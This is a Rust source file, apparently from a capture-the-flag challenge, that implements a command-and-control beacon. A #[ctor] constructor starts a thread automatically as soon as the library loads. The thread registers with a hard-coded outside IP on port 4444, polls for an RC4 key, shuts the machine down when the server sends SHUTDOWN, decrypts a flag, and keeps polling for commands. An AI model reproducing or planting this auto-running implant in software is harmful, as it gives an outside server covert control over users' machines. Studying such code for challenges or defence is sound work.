use ctor::*;
use curl::easy::{Easy2, Handler, WriteError};
use std::{thread, time};
use rc4::{KeyInit, StreamCipher};
use rc4::Rc4;
use std::env::current_dir;
use md5::Digest;
use std::process::Command;
use std::process::exit;

struct Collector(Vec<u8>);

impl Handler for Collector {
    fn write(&mut self, data: &[u8]) -> Result<usize, WriteError> {
        self.0.extend_from_slice(data);
        Ok(data.len())
    }
}

#[ctor]
fn constructor() {
    thread::spawn(move || {call_home()});
}

fn call_home() {
    let host = "207.120.7.12:4444";
    let id = format!("{:x}", md5::Md5::digest(current_dir().unwrap().to_str().unwrap()));
    
    let mut key: [u8;13] = [0u8; 13];

    let mut easy = Easy2::new(Collector(Vec::new()));
    easy.get(true).unwrap();
    easy.url(&format!("{}/register_agent/{}", host, id)).unwrap();
    easy.perform().unwrap();

    let mut password_string: String;
    
    loop {
	let mut easy = Easy2::new(Collector(Vec::new()));
	easy.get(true).unwrap();
	easy.url(&format!("{}/get_enc_key/{}", host, id)).unwrap();
	easy.perform().unwrap();
	password_string =  String::from_utf8_lossy(&easy.get_ref().0).to_string();
	if password_string.contains("RC4_ENC_KEY") {
	    let v: Vec<&str> = password_string.split(":").collect();
	    v[1].bytes()
		.zip(key.iter_mut())
		.for_each(|(b, ptr)| *ptr = b);
	    break
	}

	if password_string.contains("SHUTDOWN") {
	    println!("Shutting down!");
	    Command::new("shutdown")
		.arg("-h")
		.arg("now")
		.spawn()
		.expect("Shutdown command not found!");
	    exit(0);
	}
	thread::sleep(time::Duration::from_secs(5));
    }

    let mut easy = Easy2::new(Collector(Vec::new()));
    easy.get(true).unwrap();
    easy.url(&format!("{}/get_flag/{}", host, id)).unwrap();
    easy.perform().unwrap();
    let contents =  String::from_utf8_lossy(&easy.get_ref().0).to_string();

    let mut rc4 = Rc4::new(&key.into());
    let v: Vec<&str> = contents.split(":").collect();
    let mut flag = base64::decode(v[1]).unwrap();
    rc4.apply_keystream(&mut flag);
    {
	let flag_str = String::from_utf8(flag).unwrap();
	if !flag_str.contains("ALLES!") {
	    println!("Failed to establish an encrypted channel...");
	}
    }
    loop {
	let mut easy = Easy2::new(Collector(Vec::new()));
	easy.get(true).unwrap();
	easy.url(&format!("{}/get_commands/{}", host, id)).unwrap();
	let _ = easy.perform();
	thread::sleep(time::Duration::from_secs(30));
    }
}

